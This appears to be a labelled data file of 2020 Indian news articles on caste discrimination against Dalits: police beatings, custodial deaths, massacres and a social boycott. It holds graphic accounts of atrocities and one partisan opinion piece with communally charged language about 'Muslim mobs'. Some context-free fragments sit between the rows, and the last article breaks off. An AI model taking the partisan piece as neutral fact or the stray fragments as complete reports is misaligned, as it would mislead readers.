1,"Published: 24th July 2020 Even after the court had ordered the panchayat to issue laptops, these students were allegedly insulted by the panchayat for going to court Anakha, Ardra and their parents with the laptop A month back, I remember Anakha Babu telling me that she does not have a single photograph with her younger sister Ardra. On Thursday, however, she clicked a selfie with her sister, father and mother, inside their makeshift house that has a leaky roof. All of them smiled brightly. A new inanimate member is seen in the blurry family portrait, a Lenovo 7th Gen laptop. ""I feel proud,"" says this Dalit student, expressing a sentiment that would surprise us. It's entirely understandable, though. It had been merely a few hours since the laptop enterred Anakha's home in Nedunkandam in Idukki and memories of the struggle and legal battle to get the laptop are fresh in her mind. Anakha had applied for the laptop at the Panchayat, under a Kerala government scheme, two years ago. After running from pillar to post, hoping to get it sanctioned, the sisters approached the High Court, which ruled in their favour in June. The panchayat was to provide them with two laptops, one for each sibling, in five weeks. Anakha, undoubtedly, was elated. However, a couple of weeks back, Anakha and her mother found themselves in a helpless situation, when the panchayat members lashed out at them for going to court. ""You could have used that money to buy a laptop. Why do you trouble us?"" a panchayat member is heard asking Anakha's mother, in a voice recording that she shared with EdexLive. ""We were then told that they had placed an order with KELTRON and can't do anything apart from that,"" she says. However, after a sustained amount of attention from media and activists, Anakha received a call from KELTRON last week. ""Apparently, the panchayat had caused a delay in placing the order. Even though we had applied for it in 2018 and the court verdict was out on June 30, they placed the order only on July 9,"" she says. The laptop was finally delivered by a panchayat member on July 23. ""This laptop is the one approved for my sister, who is a student of physiotherapy. My laptop will be delivered in the first week of August,"" she says. Anakha says that this has made life much easier for her and her sister. ""My sister would otherwise receives her notes on WhatsApp. The video classes are set to begin in September. Now she can attend those classes, hassle-free,"" she says. And it couldn't have come at a better time. She has submitted her master's dissertation at the Sri Shankaracharya University of Sanskrit and is now preparing for her MPhil. ""I hope to do an MPhil and PhD after that. This laptop is my right,"" she says. During one of our previous conversations, Anakha had told me how she struggled to submit her dissertation, typing it out on a friend's old, faulty laptop. On Thursday, she wrote on Facebook, ""I have spent endless nights crying because I couldn't complete my dissertation. My parents were helpless. All that they could do was to cry alongside. The panchayat insulted my mother when she went there with the High Court's order. Our authorities and representatives should learn to grow as empathetic, responsible human beings."" She added, ""This isn't merely a laptop. This is our right to live in this country.""

1,"A real-life 'Gully Boy' Rapping has gained momentum as the choice of expression among youth for quite a while now, even more so after the success of the Ranveer Singh starrer “Gully Boy”. Migrant worker Duleshawar Tandi found fame after his rap on migrant issues in the aftermath of the national lockdown, recorded and posted online from a damaged muddy hut, struck a chord with netizens. Hailing from one of the poorest places in India, Dule Rocker, as he is popularly known as, is a real-life ‘Gully Boy’. The 27-year-old Dalit rapper had shifted to Raipur in search of work after graduating from college, no small feat for someone who came from a poor family. He moved back to his hometown to live with his mother just a day before the lockdown was announced and after seeing the troubles of workers walking hundreds of kilometres to reach home, he made a video rapping about the same. But it was another self-written rap song that he posted online in May that brought attention to him. He rapped with angst and anger about the government’s lack of regard for the plight of poor migrant workers in Kosli (or Sambalpuri) language. PARI (People’s Archive of Rural India) tweeted a small video showcasing Tandi rapping. The tweet went viral and Tandi started gaining significant attention online.  Tandi’s sudden fame is especially surprising considering the fact that he hails from Odisha’s Kalahandi, a district that is often struck by droughts, famine and poverty, so much so, that the term ‘Kalahandi Syndrome’ has come to be synonymous with backwardness and destitution. Tandi started rapping in his college days, later on giving it up when he needed money to support his family. His father died in 2017 and later on, his mother’s illness forced him to take up odd jobs and eventually move to Raipur when he noticed his friends migrating to cities in search of menial jobs. Now that the country is in lockdown and migrant workers’ issues are bubbling to the surface, Tandi is using his time to make rap videos whilst back in Kalahandi. “I don’t want to promote sleaze or liquor in my songs. Migrant workers like us have too many issues. Those things would find a place in my songs,” Tandi said. As his rap videos started gaining traction on social media, many from even the music industry praised him for his talents. Even Vishal Dadlani and Mumbai rapper Divine took to Twitter to applaud him.      This proves to be one of those times where the power of the Internet has been used for good. Tandi has now started getting offers from the Odia music industry. He continues to rap and post videos online. It’s good to see the medium of rap being used for spreading an important message and not just being used by the privileged classes.

1,"A video that went viral on social media showed the police beating the man with batons severely while his wife and others were trying to save him. The recent incident of a Dalit couple consuming pesticide and being assaulted by the police in Madhya Pradesh's Guna district is more horrific than the 2016 flogging of Dalits at Una in Gujarat, MLA Jignesh Mevani said on Saturday. A Dalit couple allegedly consumed pesticide while a drive was underway to evict them from government land on Tuesday. A video of the incident showed some police personnel purportedly beating up the husband with batons, leading to a huge outrage. The independent MLA from Gujarat has demanded that criminal cases be registered against police personnel involved in the July 14 incident. ""The Guna incident is more frightening than the Una incident in Gujarat. A five-month-old child of the victim couple was also pushed during the incident. What can be more inhuman than this?"" Mevani asked. He said if the guilty police personnel are not booked, the Shivraj Singh Chouhan-led government will face a backlash during the upcoming Assembly bypolls. Mevani alleged that atrocities against Dalits have been on the rise since the BJP came to power in the state. ""The attitude of the Shivraj Singh Chouhan government is anti-Dalit and anti-farmer,"" he said. Mevani, MP Scheduled Castes Commission member Pradeep Ahirwar, and state Congress secretary Kiran Ahirwar visited the spot of the incident and also the couple in hospital. Ahirwar said Dalits are scared in the wake of the incident. He demanded compensation for the victims Rajkumar Ahirwar (38) and his wife Savitri Ahirwar (35). The state government had transferred Inspector General (Gwalior range), Guna collector and superintendent of police following the incident while six police personnel were suspended."
1,"By Nafis Haider, TwoCircles.net Bihar: On 11 July 1996, Bathani Tola was painted red with the blood of Dalits and poor farmers which included women, children, and aged people. Swords and axes were used to chop the heads of Dalits, their wives and daughters were raped and their breasts were chopped and children were killed in cold blood. The assailants did not even spare a pregnant lady who was raped and her womb slit open and killed. A total of 21 Dalits died in what came to be known as the Bathani Tola massacre. The attackers were members of an upper-caste armed group called Ranvir Sena. Established in 1993 and gaining momentum in 1994, Ranvir Sena is the most feared in the long list of upper caste armed groups who had established a de facto monopoly over the rural areas of Bihar from the 1990s up till 2012. The rise of Ranvir Sena can be seen as a reaction to the growth of self-respect and freedom against feudal mindset in the Dalit population through the awareness programs of CPI(ML) Liberation, especially Dipankar Bhattacharya, the youngest general secretary of the party. Ranvir Sena has openly claimed responsibility for numerous massacres and killings, which include Nadhi (Bhojpur) killing in 1996, Lakshmanpur-Bathe massacre of 1997, Shankarbigha (Jehanabad) massacre in 1999. Presently, though large scale massacres do not occur, daily exploitation and skirmishes continue. Local from Bathani Tolda talk about the murder of a Dalit at the hands of an upper-caste landlord, which caused tension between Dalits and Ranvir Sena in the area. An old veteran of Ranvir Sena spoke to TwoCircles.net about the need to maintain fear. He said, “If we do not keep the labourers in check, they will rise against us which will only cause violence and anarchy. It is necessary to use violence in order to protect dharma and societal norms.” When asked about the Bathani Tola massacre, he said, “We cannot see the events in singularity. Dalits were the first to attack us. We just responded to protect ourselves and the dharma.” Decades have passed but the hegemony of Ranvir Sena still holds centre stage in power relations, especially in Bhojpur, and adjacent districts. The locals told TwoCircles.net that each year on the anniversary of the Bathani Tola massacre, the members of Ranvir Sena staged a show to display their power and invoke the Dalits who marked 11 July as a day of mourning. The day becomes so intense that Police have to create a barricade between the upper caste dominated Barki Khadawon and the Dalit majority area of Bathani Tola to prevent violence and bloodshed.  Locals said that though the private militia of Ranvir Sena does not have a direct affiliation with any particular party, they do share close connections with members of BJP and RSS. “The links with politicians help them gain immunity from the police and maintain their power in the area. Politicians do not intervene since nobody wants to lose upper caste support,” locals said. This symbiotic relation helps to maintain the structure of feudalism in the state with Dalits as the oppressed. After the election of Lalu Prasad Yadav, Dalits found visibility but even then Ranvir Sena was able to maintain their hegemony since they hold the money and influence. The current Chief Minister of Bihar Nitish Kumar, who earlier found it difficult to build a strong base in Bhojpur district by being a lower caste, now has strong support among the Bhumihar and Rajput community after his coalition with BJP, who are supported by Ranvir Sena in Bihar. Krishna (name changed), a lower caste resident of Bhojpur district said that the charm of violence and the feudal tendency still occupy the mind of Bhumihars and Rajputs in Bhojpur. After the death of Brahmeshwar Singh, and the decline of CPI (ML) Liberation in the politics of Bihar, the atrocities from both sides in terms of massacres have seen a decline but the tension still exists, revitalized by the continuous struggle against suppression by the Dalits. A Delhi University student Aditya said that, “Sena says they are protecting us from the violence of CPI (ML) Liberation who still occupy many Sarkari (government) lands and want to turn the labourers against us.” Aditya added that anyone, even from the upper caste who speaks ill of the Sena is treated as a communist and socially isolated. “That’s why no one ever speaks about their atrocities. Everyone has accepted their actions as necessary,” he said. In 2012, the Patna High Court acquitted all the 23 accused in the massacre, citing lack of evidence. Following the verdict, CPI (ML) Liberation called for a ‘Bihar Band’ and staged protests for the state government to take the case to Supreme Court. Nitish Kumar subsequently filed a petition in the Supreme Court where the case still awaits notice of hearing. The victims still have not received any substantial compensation and the area continues to be neglected in terms of development. The poverty among the Dalits and illiteracy bars them from outgrowing their traditional livelihood and they depend on the fields of the upper caste landlords which breed the cycle of suppression and domination along caste lines. Even after more than two decades, Ranvir Sena still roams with pride and maintains the hegemony on the land. The Dalits still fear their suppression and the victims of Bathani Tola still await justice. "
1,"In a shocking incident reflecting prevalence of the caste system in the country, upper caste people allegedly 'forced' members of the SC community to take off the funeral pyre the body of a 'Dalit' woman in Uttar Pradesh's Agra district, about 350 kilometres from here, saying that the cremation ground was 'reserved' for them only. According to the police sources here, the members of the dead woman's family, who hailed from the 'Nat' community, whose members were 'acrobats' and also dancers and singers, had to take the body to a different cemetery for performing the last rites. ''Just as the woman's six year old son was about to light the pyre, a group of thakur community members reached there and asked us not to cremate the body there as the cremation ground was theirs,'' said a member of the 'Nat' woman's family. District police chief Babloo Kumar said that the matter was being investigated. ''The matter will be probed by a circle office....we will take stern action against the guilty,'' Kumar said. Sources, however, said that the 'Nat' family had not yet filed any written complaint with the police perhaps fearing a backlash from the upper caste members. BSP supremo Mayawtai slammed the incident and demanded a high-level probe into the same. ''It is shameful that a Dalit woman's body was not allowed to be cremated as the cremation ground belonged to the upper castes...the government must take stern action so that such incidents did not recur,'' Mayawati said on Tuesday.

1,"News as News and Opinions as Opinions Dalit Positive Movement, a Dalit & Other Backward Castes rights initiative has lodged a complaint against The Caravan magazine for carrying an article with casteist content and making misleading demeaning statements about Hindu faith and beliefs. The article claimed that Dalits consider Mahishasur, (the evil demon) as their ancestor and that Durga Pooja is taken offensive by them. In its Twitter handle, The Caravan posted “The Indian diaspora is delighted that Diwali is commemorated in the White House. It does not care that the “good” Hindu goddess Durga’s killing of the evil Mahishasur is deeply offensive to many Dalits and Adivasis, for whom Mahishasur is an ancestor“. Many Dalits had objected for associating them with the evil demon. The comments section of the article had majority of the comments calling out the casteist and defamatory remarks against the Scheduled Caste and Scheduled Tribe community. Many condemned the gross misrepresentation of Hindu faith and for distorting Puranas.  The Dalit Positive Movement has registered a complaint with the Commissioner of Police, New Delhi and Ministry of Social Justice & Empowerment. We have lodged a Complaint against 'The Caravan' @thecaravanindia with the #MHA CoP New Delhi & @MSJEGOI for defaming and demeaning religious beliefs and practices of SC and ST communities who are part and parcel of Hinduism.

1,"A lower-caste Dalit couple in Madhya Pradesh state attempted suicide after police beat them and destroyed their crops. A lower-caste Dalit couple in India attempted suicide after police beat them and destroyed their crops, causing outrage over the latest case of police brutality against marginalised sections of society. An online video showing half a dozen police officers dragging and beating the couple with sticks to evict them from government-owned land in central Madhya Pradesh state has been viewed more than one million times since it was posted on Tuesday. Videos and photos shared on social media showed police assaulting the couple – Ram Kumar Ahirwar, 38, and Savitri Devi, 35 – along with their children, who were seen sobbing as their parents fell unconscious. “… When our standing crop has been destroyed, we don’t have other option, but to kill ourselves,” Devi was quoted as saying by the ndtv.com news website. The couple consumed pesticide moments after the eviction and were rushed to hospital, S Vishwanath, head of the local administration, told a news conference late on Wednesday, hours before he and the police chief were removed from their posts. 1/ These policemen must get the same treatment from the people, watch that lady! 😡 $#! Consider this happening to your Parents? Only the poor is going to suffer. A Dalit couple in Guna, Madhya Pradesh tried to commit suicide in front of the police administration. #Guna pic.twitter.com/MdRpbixrRs — 🚧 Vikesh Tiwari 🚀 (@tvicky002) July 16, 2020  The couple are believed to be in a stable condition at a government hospital in Guna district of Madhya Pradesh. But the police have registered a case against them for trying to obstruct public servants from the discharge of their duty. “To force a couple to attempt suicide by damaging their crops … is most cruel and shameful,” Kumari Mayawati, a Dalit political leader, said on Twitter. “Nationwide condemnation of the incident is natural. Government should take strict action.” Government and senior police officials were not immediately available for comment. The eviction was part of a drive to stop encroachment on land and the area the couple was farming had been allotted for the construction of a college, a policeman told Reuters. He declined to be named as he was not authorised to talk to the media. They were begging the police to not destroy their crops as they were in debt ... but the police did not listen to them. N Kumar, a neighbour of the couple, told the Thomson Reuters Foundation Six police officers were suspended on Thursday and the state government has ordered an investigation into the incident. The main opposition party in the state, the Congress, blamed the ruling Bharatiya Janata Party (BJP) for the police brutality. “[Chief Minister] Shivraj Singh Chouhan’s shameless display of arrogance,” the party tweeted. “His police force brutally beat up a farmer couple and tore the woman’s clothes. The children are screaming. The end of this blind, deaf and dumb government is near.” Former chief minister of the state, Kamal Nath, also condemned the “merciless” beating of the Dalit couple. “What kind of jungle raj [rule] is this?” he tweeted. The case comes weeks after a father-son duo died in police custody in the southern state of Tamil Nadu. At least five policemen have been arrested over the deaths that caused a public outcry. India banned discrimination based on caste – a system which divided Hindus into groups based on occupations – in 1955. But centuries-old biases against lower-caste groups persist, making it harder for them to access education, jobs and homes.       A growing population and rising pressure on land to build homes, highways and industry is triggering conflicts, with lower-caste citizens often facing eviction, particularly in rural areas where biases are most entrenched, campaigners say. More than half of India’s lower-caste population is landless, according to census data. Several states have laws aimed at giving land to Dalits but few have produced results, according to Dalit activists and leaders. “They were begging the police to not destroy their crops as they were in debt … but the police did not listen to them,” N Kumar, a neighbour of the couple, told the Thomson Reuters Foundation by phone from Nankhedi village. He said the couple had asked the police to wait for two months so that they could harvest their crops. Ram Prakash Sharma, a tribal and Dalits’ rights activist in Madhya Pradesh, described the incident as “unfortunate” and urged authorities to do more to help the couple. “The Dalits in Madhya Pradesh are one of the most backward people and they do not own farming land,” he told Reuters. “The government must provide this couple a house and employment so that they can feed their kids and not die of starvation.” Follow Al Jazeera English:"

Nath tweeted on Wednesday, ""Where is Shivraj government taking the state to? What is this jungle raj? Barbaric lathicharge by policemen of Cantt police station area in Guna."" Nath also attached the video of the incident. He further said, ""Even if there is a dispute regarding the land, it can be resolved legally, but in this way taking the law in hand, beating him, his wife, family and innocent children so ruthlessly, where is the justice? Is it because he belongs to a Dalit family, and is a poor farmer?"" Earlier, Home Minister Narottam Mishra ordered a high-level inquiry into the incident. BJP Rajya Sabha member Jyotiraditya Scindia has also called the incident unfortunate and spoke to Shivraj Singh Chouhan and called for strong action against the insensitive officers. Meanwhile, collector Vishwanathan said that the land was reserved for a college building and was illegally occupied by local land mafia Gabbu Pardi who gave it to Rajkumar Ahirwar on a share basis. He said Pardi used the Ahirwar family to encroach upon the land. He also said the condition of the Dalit couple is stable and they are recovering in the hospital.

1,"The custodial death of a Dalit man has sparked an intense outrage in the state of Andhra Pradesh after the opposition parties have slammed the ruling Jagan Mohan Reddy led government against the police excess handling and attacking the Dalits in the state. The fresh resentments have erupted after the death of a Dalit man identified as Yericharla Kiran, who died in the police custody on the night hours of Tuesday in Prakasam district of the state. Kiran was reportedly arrested and taken under the police custody for not wearing a face mask while he was riding his vehicle. According to the reports, Kiran was arrested by the police on July 18 under the grounds of not wearing a mask, which was mandated to follow to curb the COVID-19 spread. He and his friend were riding in a COVID-19 hotspot of Chirala town in Prakasam district without wearing masks and helmet. According to the police, the duo was stopped and constable Rami Reddy had scolded them for violating the guidelines. The police stated that the duo was under the influence of alcohol and developed the altercation with the constable. Later, they were taken under custody by Sub-Inspector (SI) Vijay Kumar. After being taken under custody, Kiran was taken to the Chirala Government Hospital after sustaining a severe head injury. He was then taken to a private hospital in Guntur for further treatments. However, he has died at the hospital on Tuesday while he was under the police custody and his death has stirred massive outrage against what has become the shocking incident of police brutality. According to the police's version, Kiran has jumped out of the moving police vehicle while he was being taken to the police station following which he has got an injury in his head. However, Kiran's family members refuted the assertion of the police and they alleged that he had died due to the head injury that happened due to the police beating. Following the development, Kiran's father has lodged a complaint against Sub-Inspector Vijay Kumar, and based on his complaint, Vijay Kumar has been booked under section 324 of IPC - voluntarily causing hurt by dangerous weapons. The Andhra Pradesh government has launched the probe into the death of the Dalit man. Chief Minister Jagan Mohan Reddy said that Rs 10 lakh will be provided to the family of the deceased as a solatium. According to the reports, the probe would be conducted by the Additional Superintendent of Police. On Wednesday, Chirala had seen an outrage following Kiran's death, leaving the government to deploy more police forces for the security measures. Condemning the incident, Telugu Desam Party (TDP) General Secretary Nara Lokesh said that the police had thrashed Dalit Kumar with the view of receiving appreciation from the ruling party leaders. By stating that the police are attacking the Dalits like goondas, he questioned the prevalence of the law and order in the state. Copyright © 2019 thenewstuff.in All Rights Reserved"
1,"A Facebook comment of one Naveen Kumar, nephew of Dalit Congress MLA Akhanda Srinivas Murthy, caused a crude display of Islamic radicalism and intolerance on the streets of Bengaluru as a mob of thousands took to burning the house of the MLA and also causing extensive damage to public and private property. The mob-violence by Muslim mobs on the streets of Bengaluru led to 60 cops being injured. While one would expect the Congress to stand up for its MLA, the Grand Old Party displayed its sheer lack of spine as it took to name-calling his nephew, Naveen as someone who is associated with the BJP. Crossing all lines of decency and sanity, and displaying their shameless perception of secularism, which is a synonym for “Muslim appeasement”, the Congress thought it fit to throw its MLA under the bus and leave him to fend for himself. The party also did not dare speak the truth about the violence, as doing so would alienate Muslim voters from its fold. Therefore, Congress did all in its power to downplay the criminality of the Muslim mob, even if that came at the cost of abandoning their Dalit MLA. Liberal media, which serves as the Congress’ mouthpiece on all such occasions, has meanwhile taken to portray Naveen Kumar as the ultimate villain and has also decided to take it upon itself the task of absolving the mob of their fundamentalist crimes. India Today, whose Data Intelligence Unit is reportedly headed by the intelligent Rahul Kanwal, decided to publish a profile of Naveen Kumar, the infamous man who dared speak ill of the Prophet of Islam, even if as a retaliatory comment. The said profile was prepared using ‘digital forensics on his social media accounts done by India Today’s Open Source Intelligence Team’. The headline of the profile on Naveen reads, “A Sunny Leone fan, a political aspirant: Know more about man allegedly behind post that burnt Bengaluru.” A recently married self proclaimed fan of Sunny Leone’s charity work and a wannabe neta, who is P Naveen Kumar, who’s posts sparked the Bengaluru riots. Our OSINT desk ran some digital forensics on his deleted SM handles to draw up this character profile https://t.co/92qE1Xw4CO — Rahul Kanwal (@rahulkanwal) August 15, 2020  Why does Sunny Leone make it to the story’s headline, you would ask? Apparently, the man had once shared a birthday wish for Sunny Leone, and that was sufficient material for the “Open Source Intelligence Team” of India Today to judge him as a fan of the former adult-film actor. The profile of Naveen prepared by India Today is nothing short of an endeavour to make the ‘blasphemous’ man look like the devil incarnate. Being a media house sympathetic to left-liberal ethos, while India Today would on any other day praise people who appear to look like ‘secular’ and ‘pluralists’, the Kanwal-led intelligence team thought it fit to make an exception of this man. As such, while Naveen appears to be secular, India Today doesn’t seem to like this trait in the man. Therefore, the media house goes on to label Naveen as a man who has no “rigid political ideology” and whose posts “shout communal harmony”. In addition to doing their bid at distancing Naveen from the Congress, India Today, led by Rahul Kanwal’s new career-low, takes to portray the man as a non-achiever, who was not a “bright student” and who was “no stranger to controversy”. A Deccan Herald report spoke to the same effect, citing ‘sources’ as saying that Naveen is a ‘serial offender’, who is habituated to passing derogatory comments against the community that reveres the Prophet, while also insulting the revered figure himself. The report makes it a point to make Naveen look like the aggressor who deserves to be punished for his trespasses against Islam as if India is ruled by sharia law and bears resemblance to Pakistan. The report said, “Sources revealed that Naveen, nephew of MLA Akhanda Srinivas Murthy and the second son of his sister, has a history of posting derogatory content triggering hatred. He posted abusive content on August 5 about the Padarayanapura incident”. Ravish Kumar, who leaves no opportunity of pinning the blame on Hindus for any crime committed across the country by random people against Muslims thought it fit this time, though, to pass lectures on how the violent mob of Muslims in Bengaluru was, in-fact, a non-religious one. “A rioter is a rioter. He has nothing to do with Hinduism or Islam.” The boring and unwatched journalist further added, “Rioters look for a reason to be provoked. Those who know this game plan are well acquainted with the fact that a post can attract mobs who will unleash violence.” While a section of Indian media works overtime to absolve the Muslim mob of all wrongdoings, it deems it fit, like the Congress, to throw a Dalit MLA and his nephew under the bus. One wonders what hell would have been broken loose had the mob been consisted of Hindus instead of Muslims. ।। Political Enthusiast ।।Compulsively Opinionated ।। Aspiring Journalist ।। ਮਨ ਨੀਵਾਂ ਮੱਤ ਉੱਚੀ ।। Your email address will not be published.

1,"Odisha: 40 Dalit families face social boycott after girl plucks flowers from upper-caste man's farm In a shocking incident, around 40 Dalit families in Kantio Kateni village of Dhenkanal district in Odisha were allegedly subjected to social boycott after a 15-year-old girl plucked flowers from the garden of an upper-caste man. The village comprises over 700 families, of which 40 belong to the Scheduled Caste Naik community. “The two groups were at loggerheads for a long time due to an old rivalry and it snowballed into a major controversy after the girl plucked flowers from the garden of an upper-caste man,” Tumusinga police station inspector in-charge A K Dungdung said. According to the villagers, the girl belonging to Dalit community had plucked the flowers two months ago. The girl's parents also apologized and begged the village panchayat to pardon them but there no response from upper caste people. Their ordeal ended following the intervention of police and administration, a police officer said. According to ANI, as a punishment the families are barred from taking part in rituals and are not allowed to talk to anybody in the village. In fact, the government ration shops have been told not to give provisions and the teachers from the community are being forced to obtain a transfer, families allege. However, the matter is resolved now. ""Due to plucking of a sunflower, we Dalits were boycotted and a case was registered at Police station. Police had called the two groups to resolve the matter. But they did not obey, so after some days, we complained again. Now the matter has been resolved in front of officials,"" Bijay Kumar Naik, villager and member of Dalit community told ANI. Harmon Mohalik, villager and member of upper caste community said, ""It was a little issue between Dalit community and our community. The matter has been Already solved in front of police and other officials."" Pranabandhu Das, village Sarpanch said that the villagers are living as they used to live earlier. ""It had happened two months back but people turned it into a matter related to communities. Today it was resolved at Police Station in front of officers. Now we are living as we did earlier, as per the discussion between both groups,"" Das said.

1,"Advertisement Chandrababu Naidu demands Andhra CM to ""break silence on Dalit atrocities"" Photo Credit :   Amravati (Andhra Pradesh) [India], Aug 30 (ANI): Former Andhra Pradesh Chief Minister and Telugu Desam Party (TDP) leader N Chandrababu Naidu on Sunday flayed YSRCP government for maintatining silence on the ""ongoing atrocities being committed against the Dalit community and take responsibility for the violence.""""Chief Minister YS Jagan Mohan Reddy must break his silence on the ongoing atrocities being committed against the Dalit community and take responsibility for the violence, crimes and anti-social activities of his party's leaders,"" Naidu said in a video conference with Vishakapatnam district leaders and the Dalit association. He further said that the criminals were growing bold and brazen because they were confident of support from the Chief Minister. ""Such atrocities were never witnessed when the TDP was in power. If the Chief Minister took strong action on the first incident, these series of attacks would not have happened later, and several victims would be spared from humiliation and harassment,"" he said. ""The accused in the two tonsure incidents that took place in the last two months were not afraid of facing the rule of law. The government has snatched way the land of Sankar Rao which is highly reprehensible. There is no safety and security for the lives, property, and self-respect of the weaker sections in Andhra Pradesh any more. The YSRCP made it a single point program to let loose criminals on all those raising their dissenting voices against the Government and then cover up their atrocities,"" Naidu added. Naidu further said, ""First, ruling party leaders targeted, harassed, arrested and humiliated the TDP leaders. Later, they launched atrocities against the leaders of the backward classes. Now, they are unleashing a reign of terror against innocent Dalits. False cases have been filed against all those who have agitated against the Government's excesses and illegal activities. Om Pratap's death was first termed as a suicide. Later, it was called a natural death and allowed the last rites to be performed. Finally, following criticism from the people, a secret post mortem was conducted."" He further said that there was ""no limit to the YSRCP's atrocities considering how another Dalit youth was said to have died in the 'overturning of a tractor.""""How were there burns on the body of the youth? The ruling party leaders should explain how the burns showed up on the body if it was an accidental death. The agitation should continue till these atrocities stop. Peoples' organizations should strongly condemn these misdeeds with one voice with non-stop protests,"" he added.

1,"Uttar Pradesh police Agitated locals blocked the Raebareli-Fatehpur National Highway on Sunday after a Dalit youth died in ‘illegal’ police custody allegedly due to incessant police beating. Defying claims, the police officials said that the youth was not tortured and he had developed COVID like symptoms before dying. A resident of the Poore Baiju village under Lalganj Police Station limits of Rae Bareli, the deceased- Mohit’s family alleged that he died due to police torture. On August 26, Mohit along with his brother- Sonu was picked up from their residence in a theft case. As per information, Sonu alleged that the police had mercilessly beaten Mohit in the lockup, and on August 28 they released him but they kept Mohit in custody. The next day, Mohit’s health worsened and he was brought to the district hospital for treatment where he succumbed. The bereaved family members took to streets and on Sunday evening raised slogans against police atrocities. However, when the district and police administration did not reach the spot on time, the protestors came out on the road and blocked the Raebareli-Fatehpur National Highway. “The police were working against an auto-lifter gang, and during which four people were arrested and also 10 motorcycles were recovered. During an interrogation with the ones arrested, names of Sonu and his brother Mohit surfaced after which they were brought to the police station on August 28 for interrogation. During this, Mohit complained about stomach ache following which he was sent to the district hospital. He had a complaint of pneumonia and fever and his oxygen level was also low. He died during treatment. Preliminary investigation reveals that the accused were kept in illegal detention for more than 24 hours and for that we have suspended the SHO,” Superintendent of Police Raebareli, Swapnil Mamgain said. Responding to the youth’s death, the Uttar Pradesh Congress Committee Chief Ajay Kumar Lallu attacked the state government and wrote, “Dalit youth dies in police custody in Rae Bareli. Police suppression of Dalits and the exploitation continues in the BJP government. Every day this 'Jungle Raj' causes one life or the other. There is a flood of killings but the government remains insensitive. The Chief Minister should come forward and answer the questions of the public.”"
1,"The Odisha Human Rights Commission (OHRC) has taken suo motu cognizance of 40 Dalit families facing social boycott from upper caste villagers in Kantio Kateni village of Dhenkanal district and sought a report in the matter from the authorities by September 15. Citing news reports, the commission has observed that “the 40 scheduled caste families have been living in fear after people from the upper castes allegedly excommunicated them from the village”. “The issue allegedly got momentum from a trivial matter of confrontation between the scheduled castes and the upper caste over plucking of flowers by some girls of the SC community,” it said. “Now the said SC community people are barred from going to shop, sharecropping, doing work under MGNREGS,taking out procession, participating in social functions etc. for which they are unable to fetch day to day requirements also. It is also alleged that the villagers have stopped talking with the SC community people,” the commission stated. The order passed by the commission’s Chairperson Justice Bimla Prasad Das termed social ostracism/boycott an “inhuman practice” and emphasised that it requires serious attention and action by state authorities. “In this background while taking cognizance of the matter suo motu, we have no alternative than to caution the authorities to take effective steps against the persons responsible for it after due inquiry and give us a report. Let the Collector and the District Magistrate Dhenkanal and Superintendent of Police, enquire into the matter and give their respective reports to the commission,” the order stated. Meanwhile, following the intervention of authorities, the situation in the village is returning to normalcy. Sarpanch Pranabandhu Das said, “We have been holding repeated dialogues between the two communities. Things are now moving back to normal. The diktat to not speak to each other does not exist anymore.” The matter had escalated after the girls plucked flowers from the backyard of Saisdeba Behera (36). Behera said the communities are working towards resolving pending issues. “I grow sunflowers and sell them for oil production. That day, three girls started plucking the flowers. I objected because they couldn’t have used it for prayers, they were simply wasting the flowers. Soon their elders joined in and a brawl broke out between members of the two communities,” he said. “We reached out to the police and the matter was resolved, but the girls started making false allegations that I tried to misbehave. They approached the police with these false accusations. Because of this, multiple meetings were held and we decided to boycott them,” Behera added. Jyoti Naik, a member of the Dalit community, said, “It is true that the situation is limping to normalcy. But it will take a while to bury all issues and move ahead. For now, it is important that we are deprived of our rights.” 📣 The Indian Express is now on Telegram.

They were under preventive custody and released later,"" Prasad said. Uday Inala, National Secretary, ABVP, stated, ""The brutal baton-charge against the protesting ABVP activists betrays the complicity of the ruling TRS regime in protecting culprits of its own ilk as well as the named accused belonging to the CPI (Marxist) affiliated Students' Federation of India (SFI) and Swaeroes.""""ABVP will continue its agitation until a timely, fair and competent investigation into the complaint made by the Dalit victim is concluded and speedy trials are commenced to bring all the perpetrators involved in this ghastly crime to justice.

She suffered cigarette burns and the SFI activists blackmailed her using her photos in compromising positions that were taken against her will.

1,"By Aparajita Ghosh, TwoCircles.net Mumbai: “His head was blooming just like a lotus”, recalls Mangesh Shivsharan’s mother, who collected parts of his nine-year-old son’s brain, after he was hit by a bullet fired by police in Mumbai. As many as 10 Dalits were killed and 26 injured by Special Reserve Police Force (SRPF) led by PSI Manohar Kadam on 11 July 1997 in Ghatkopar’s Ramabai Nagar of Mumbai. The residents had witnessed Dr Babasaheb Ambedkar’s statue garlanded with sandals at dawn on Friday, causing anger among them and this resulted into protests. The crowd reportedly enforced rasta roko, blocking the Eastern Express Highway and lodged a complaint to the Beat No.5 of Pantnagar Police Station which is situated within Ramabai Nagar. In no time, a total of four vans of SRPF arrived near the statue and began firing into the crowd. “The distance between the statue and the police force was fifty steps when they opened fire in the alleys of the colony”, said Jaywant Hire, a senior journalist and a social activist from Ramabai Nagar. “Namdeo Surwade came running to me when he was shot on his arm. He told me that firing was going on inside. I immediately called several ministers and media after seeing the site, and around 12 in the noon, police arrested me from my house”, he added. Soon ‘Mumbai Bandh’ was declared with shutters pulled down and railway tracks uprooted, bringing trains to halt and traffic being diverted from the nearby areas. The Dalit strongholds of Mumbai witnessed stone-pelting incidents as well. A twenty-two-year-old Hitesh Bhalerao was killed in a protest against the Ramabai Nagar incident in the eastern suburbs of Kurla when the police opened fire on the crowd. Raghunath Jadhav was on his way to work and while walking to the bus stop he was shot in his arm, “I was clueless where the bullet came from. A boy came running to me saying your arm is bleeding and I fell unconscious right after.” The police force lathi-charged and used tear gas to disperse the residents who would take recourse inside the alleys of the colony for cover. “I was shot just outside my house when I saw police entering the alley and started firing out of nowhere. I first thought it must be the sound of fireworks,” said Hiraman Gaikwad. The street was spattered with blood and the bullets pierced through tin-roofed homes. The brutal firing continued for nearly fifteen minutes and around fifty rounds of bullets were fired. “A doctored video was recorded by Ravi Shinde, near the highway with a fabricated LPG tanker story”, said Hire. Ramchandra Dhanawade, the father of Anil Dhanawade, broke down while narrating the gory details of losing his 18-year-old. “He was shot on his chest when he went to drop his nephew for school,” he said. In their defence, the police stated that they fired after the crowd set a passenger bus on fire and they (police) were apprehensive that they would set the tankers ablaze too. “They fired indiscriminately without observing any norms at all. Several bullets had hit above the waists of the victims. This situation was uncalled-for”, said Advocate B. G. Bansode, who represented Ramabai Nagar residents at Gundewar Commission. Among the victims, Sukhdev Kapadne, Nandu Katare, Sanjay Nikam, Amar Dhanawade, Vilas Dodke, Anil Garud, Sanjay 